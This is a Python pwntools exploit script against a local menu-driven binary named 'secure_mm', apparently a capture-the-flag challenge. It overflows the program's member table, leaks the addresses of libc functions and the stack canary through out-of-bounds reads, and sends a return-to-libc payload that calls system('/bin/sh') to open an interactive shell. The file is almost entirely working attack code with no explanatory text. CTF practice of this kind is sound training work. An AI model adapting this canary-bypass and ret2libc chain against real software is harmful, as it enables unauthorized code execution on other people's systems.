#!/usr/bin/env python
import pwn, sys
import re
import struct
diff = 0x1001364E0
p = pwn.process(['./secure_mm'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

def create_member(Nick, age, we, job):
    p.recvuntil("Quit")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(Nick)
    p.recvuntil(":")
    p.sendline(str(age))
    p.recvuntil(":")
    p.sendline(str(we))
    p.recvuntil("...")
    p.sendline(str(job))
    return

def update_member(mid,Nick,age,we,job):
    p.recvuntil("Quit")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(mid))
    p.recvuntil(":")
    p.sendline(Nick)
    p.recvuntil(":")
    p.sendline(str(age))
    p.recvuntil(":")
    p.sendline(str(we))
    p.recvuntil("...")
    p.sendline(str(job))
    return

def update_membera(mid,Nick,age,we,job):
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(mid))
    p.recvuntil(":")
    p.sendline(Nick)
    p.recvuntil(":")
    p.sendline(str(age))
    p.recvuntil(":")
    p.sendline(str(we))
    p.recvuntil("...")
    p.sendline(str(job))
    return


def delete_member(overflow, mid=0):
    p.recvuntil("Quit")
    p.sendline("3")
    p.recvuntil("(y/n)")
    p.sendline(overflow)
    if overflow == "y":
        return
    else:
        p.recvuntil(":")
        p.sendline(str(mid))
        return  

def create_post(title, mid, category, content):
    p.recvuntil("Quit")
    p.sendline("5")
    p.recvuntil(":")
    p.sendline(title)
    p.recvuntil(":")
    p.sendline(str(mid))
    p.recvuntil("?")
    p.sendline(str(category))
    p.recvuntil(":")
    p.sendline(content)
    return

def list_post(overflow, PID=0):
    p.recvuntil("Quit")
    p.sendline("8")
    p.recvuntil("(y/n)")
    if overflow == "y":
        p.sendline(str(overflow))
        return
    else:
        p.sendline(str(overflow))
        p.recvuntil(":")
        p.sendline(str(PID))
        return

def update_post(PID, title, mid, category, content):
    p.recvuntil("Quit")
    p.sendline("6")
    p.recvuntil(":")
    p.sendline(str(PID))
    p.recvuntil(":")
    p.sendline(title)
    p.recvuntil(":")
    p.sendline(str(mid))
    p.recvuntil("?")
    p.sendline(str(category))
    p.recvuntil(":")
    p.sendline(content)
    return

def delete_post(overflow, pid = 0):
    p.recvuntil("Quit")
    p.sendline("7")
    p.recvuntil("(y/n)")
    if overflow == "y":
        p.sendline(overflow)
        return
    else:
        p.sendline(overflow)
        p.recvuntil(":")
        p.sendline(pid)
        return

def delete_posta(overflow, pid = 0):
    p.sendline("7")
    p.recvuntil("(y/n)")
    if overflow == "y":
        p.sendline(overflow)
        return
    else:
        p.sendline(overflow)
        p.recvuntil(":")
        p.sendline(pid)
        return

def list_member(overflow, mid=0):
    p.recvuntil("Quit")
    p.sendline("4")
    p.recvuntil("(y/n)")
    p.sendline(overflow)
    if overflow == "y":
        return
    else:
        p.recvuntil(":")
        p.sendline(str(mid))
        return  

def list_membera(overflow, mid=0):
    p.sendline("4")
    p.recvuntil("(y/n)")
    p.sendline(overflow)
    if overflow == "y":
        return
    else:
        p.recvuntil(":")
        p.sendline(str(mid))
        return  

def quit():
    p.recvuntil("Quit")
    p.sendline("9")
    return

nick = "AAAA"

for i in range(500):
    create_member(nick,21,1,1)
delete_member("y")
create_post("A",0,1,"Content")
list_member("n",10001)
response = p.recvuntil("Quit")

n = re.search("age.*", response)
m = re.search("experience.*",response)

#codebase = hex(int(n.group()[6:].strip()) + 4294953601) 
#print "Codebase leaked at:" + codebase

sys = int(m.group()[13:].strip()[:-6].strip())
sysaddr = (sys+int(0x1001364E0))
print "[+] System() is at: "+ hex(sysaddr)
exitaddr = sysaddr - 0xDFD0
print "[+] Exit() is at:" + hex(exitaddr)
libcmain = sysaddr -0x258C7
print "[+] libc_main is at:"+hex(libcmain)
canaryaddr = sysaddr + 0x18CFC4
print "[+] Address of stack canary -> " + hex(canaryaddr)
update_membera(10001, "A", canaryaddr - 0x100000000+1, 0, 1)
list_post("n",20001)
response = p.recvuntil("Quit")
#print response

r = re.search("category.*",response)
r = r.group()[11:14]
#print r

canary = struct.unpack('I','\x00'+ r)[0]
print "[+] Canary is: "+hex(canary)
binshaddr = libcmain + 0x13AA41
print "[+] Addr of /bin/sh :" + hex(binshaddr) 

payload  = "A" * 8
payload += struct.pack("I", canary)
payload += struct.pack("I", 0)*3
payload += struct.pack("I", sysaddr)
payload += struct.pack("I", exitaddr)
payload += struct.pack("I", binshaddr)

list_membera(payload)

p.interactive()



